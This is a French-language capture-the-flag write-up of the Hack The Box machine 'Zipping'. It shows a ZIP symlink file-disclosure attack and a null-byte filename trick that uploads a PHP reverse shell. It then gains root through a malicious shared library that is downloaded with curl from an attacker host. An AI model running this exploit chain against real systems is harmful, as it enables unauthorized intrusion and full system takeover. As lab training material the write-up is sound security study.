+++
title = "HTB - Writeup"
date = "2024-01-15"
author = "Brainmoustache"
authorTwitter = "BrainMoustache" #do not include @
cover = ""
tags = ["hackthebox", "zipping"]
keywords = ["", ""]
description = "Resume of Zipping from Hackthebox"
showFullContent = false
readingTime = true
hideComments = false
color = "blue"
+++

# HTB - Zipping
## Enumeration:
Nmap
```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-26 15:04 EDT
Nmap scan report for 10.129.129.1
Host is up (0.056s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA)
|_  256 eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))
|_http-title: Zipping | Watch store
|_http-server-header: Apache/2.4.54 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## User exploit
Naviguer dans l'application Web au niveau de la fonctionnalité d'upload de fichier `upload.php`.
Le première vulnérabilité a exploité est un `ZIP Symlink`. 

> `ZIP Symlink` permet de créer un fichier `zip` avec un fichier `symlink` spécial qui pointe vers un autre fichier arbitraire `/etc/passwd`. Lorsque le fichier sera extrait, il sera possible d'accéder au fichier. Au final, il s'agit aussi d'une vulnérabilité de type `file disclosure vulnerability` 
> 
> ref: https://secops.group/anatomy-of-a-file-upload-attack/ 

Dans le cas présent, cette vulnérabilité peut être utilisée afin d'accéder au fichier `upload.php`

```bash
ln -s ../upload.php
zip --symlinks wiz4rds.zip upload.pdf
```
Voici le contenu du fichier `upload.php`:
```php
<?php
if(isset($_POST['submit'])) {
  // Get the uploaded zip file
  $zipFile = $_FILES['zipFile']['tmp_name'];
  if ($_FILES["zipFile"]["size"] > 300000) {
	echo "<p>File size must be less than 300,000 bytes.</p>";
  } else {
	// Create an md5 hash of the zip file
	$fileHash = md5_file($zipFile);
	// Create a new directory for the extracted files
	$uploadDir = "uploads/$fileHash/";
	// Extract the files from the zip
	$zip = new ZipArchive;
	if ($zip->open($zipFile) === true) {
	  if ($zip->count() > 1) {
	  echo '<p>Please include a single PDF file in the archive.<p>';
	  } else {
	  // Get the name of the compressed file
	  $fileName = $zip->getNameIndex(0);
	  if (pathinfo($fileName, PATHINFO_EXTENSION) === "pdf") {
		mkdir($uploadDir);
echo exec('7z e '.$zipFile. ' -o' .$uploadDir. '>/dev/null');
		echo '<p>File successfully uploaded and unzipped, a staff member will review your resume as soon as possible. Make sure it has been uploaded correctly by accessing the following path:</p><a href="'.$uploadDir.$fileName.'">'.$uploadDir.$fileName.'</a>'.'</p>';
	  } else {
		echo "<p>The unzipped file must have  a .pdf extension.</p>";
	  }
	 }
	} else {
	  echo "Error uploading file.";
	}

  }
}
?>
```
Comme il est possible de constater à la lecture du code, cette fonction PHP valide qu'au niveau du fichier `zip`, seulement les fichiers avec une extension `pdf` sont acceptées. Afin d'obtenir un reverse shell, voici l'explication de `0xdf` 

>So what happens with the null byte in the name on Zipping? It will get the zip and when it gets the filename, it gets the full name, 0xdf.php\x00.pdf. It checks that the file has a .pdf extension, which it does. It then uses 7z to extract, creating the file /tmp/uploads/[hash]/0xdf.php.
Then PHP checks if the file exists, and it doesn’t, as it’s looking for /tmp/uploads/[hash]/0xdf.php\x00.pdf. So it doesn’t move the directory to the web, and it continues (sending back a success message with the path that doesn’t exist).

Afin d'exploiter cette vulnérabilité, il faut tout d'abord créer un fichier avec un byte connue (0x41)(e.g.: `rev.phpA.pdf`)

```bash
mkdir exploit && cd exploit
cp /usr/share/webshells/php/php-reverse-shell.php rev.phpA.pdf
zip exploit.zip rev.phpA.pdf
```

Par la suite, il faut utiliser un `hex editor` et de modifier la deuxième occurence disponible du byte dans le nom de fichier afin de le remplacer par un `null byte (0x00)`

![](/content/img/htb/zipping_hex_editor.png)

Téléverser ensuite le fichier `zip` modifié sur le serveur.

```http
POST /upload.php HTTP/1.1
Host: 10.129.130.82
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------408806559242910997263418072045
Content-Length: 1905
Origin: http://10.129.130.82
Connection: close
Referer: http://10.129.130.82/upload.php
Cookie: PHPSESSID=eevnkrloohrm29q71nslklh5p8
Upgrade-Insecure-Requests: 1

-----------------------------408806559242910997263418072045
Content-Disposition: form-data; name="zipFile"; filename="exploit_hex.zip"
Content-Type: application/zip

PK
[...]
-----------------------------408806559242910997263418072045

Content-Disposition: form-data; name="submit"

-----------------------------408806559242910997263418072045--
```
http://10.129.129.1/uploads.php

![](/content/img/htb/zipping_rev_shell.png)

Naviguer vers l'URL
`http://10.129.129.1/uploads/adf343517b7619d3a07995c1fc6bf62d/rev.php`

```bash
┌──(kali㉿kali)-[~/hackthebox/zipping]
└─$ nc -lvnp 7001 

listening on [any] 7001 ...
connect to [10.10.14.150] from (UNKNOWN) [10.129.149.251] 46946
Linux zipping 5.19.0-46-generic #47-Ubuntu SMP PREEMPT_DYNAMIC Fri Jun 16 13:30:11 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 00:38:22 up 3 min,  0 users,  load average: 0.04, 0.08, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(rektsu) gid=1001(rektsu) groups=1001(rektsu)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
rektsu
```

## Root exploit
L'utilisateur `rektsu` peut exécuter un binaire avec le privilège root. 

```bash
$ sudo -l
Matching Defaults entries for rektsu on zipping:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User rektsu may run the following commands on zipping:
    (ALL) NOPASSWD: /usr/bin/stock
```

Le binaire en question, `stock`, requière un mot de passe qu'il est possible d'identifier en regardant les `strings` disponible dans ce dernier.

`strings /usr/bin/stock`
```bash
PTE1                          
u+UH
Hakaize                      
St0ckM4nager   <--        
/root/.stock.csv     
```

L'application contient quelques fonctionnalités, donc l'une prénommée `XOR`.

Voici le code de la fonction dans Ghidra:
```c
iVar1 = checkAuth(password);
if (iVar1 == 0) {
   puts("Invalid password, please try again.");
   uVar2 = 1;
}
else {
   local_e8 = L'\x0c040967';
   local_e0 = 0xe2b4b551c121f0a;
   local_d8 = 0x908244a1d000705;
   local_d0 = 0x4f19043c0b0f0602;
   local_c8 = 0x151a;
   local_f0 = L'\x616b6148';
   XOR(&local_e8,0x22,&local_f0,8); <--
   local_28 = dlopen(&local_e8,1);
```
Lorsqu'on lance le binaire dans `gdb` (gdb ./stock) et que l'on place un breakpoint au niveau de la fonction `main` (b main), il est possible de voir au niveau des registres qu'il y a un `shared object library` du nom de `libcounter.so` qui est utilisé. 

> Une `shared object library` est la même chose qu'une `DLL` sous Windows. Ces dernières contiennent des fonctions/méthodes qui peuvent être utilisées par divers programmes lorsqu'elles sont référencées. Ce sont des librairies. 

```c
00:0000│ rsp 0x7fffffffe250 —▸ 0x7fffffffe328 ◂— 0x500000000
01:0008│     0x7fffffffe258 ◂— 0x12f9
02:0010│     0x7fffffffe260 —▸ 0x7ffff7ffdab0 (_rtld_global+2736) —▸ 0x7ffff7fcb000 ◂— 0x3010102464c457f
03:0018│     0x7fffffffe268 ◂— 0x657a69616b6148 /* 'Hakaize' */
04:0020│     0x7fffffffe270 ◂— '/home/rektsu/.config/libcounter.so'
05:0028│     0x7fffffffe278 ◂— 'ktsu/.config/libcounter.so'
06:0030│     0x7fffffffe280 ◂— 'nfig/libcounter.so'
07:0038│     0x7fffffffe288 ◂— 'counter.so'
```

Lorsqu'on se rend dans le répertoire `/home/rektsu/.config/`, il est possible de constater que la librairie est absente. Afin d'exploiter le programme, il suffit de créer un `shared object library (libcounter.so)` malicieux et de le placer a l'emplacement que le programme s'attend. 

Voici le contenu du fichier:
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

Par la suite, il faut `builder` la librairie et la téléversée dans le bon répertoire:
```bash
gcc -shared -o libcounter.so -fPIC libcounter.c
curl http://10.10.10.10/libcounter.so -o /home/rektsu/.config/libcounter.so
```

Lorsque le programme est lancé, on obtient les privilèges `root`

```bash
rektsu@zipping:/home/rektsu/.config$ sudo /usr/bin/stock
Enter the password: St0ckM4nager
root@zipping:/home/rektsu/.config#
```


## Resources:

| Hyperlink                                                                                        | Info         |
| ------------------------------------------------------------------------------------------------ | ------------ |
| https://book.hacktricks.xyz/linux-hardening/privilege-escalation/write-to-root#etc-ld.so.preload | C program    |
| https://0xdf.gitlab.io/2024/01/13/htb-zipping.html                                               | 0xdf writeup |
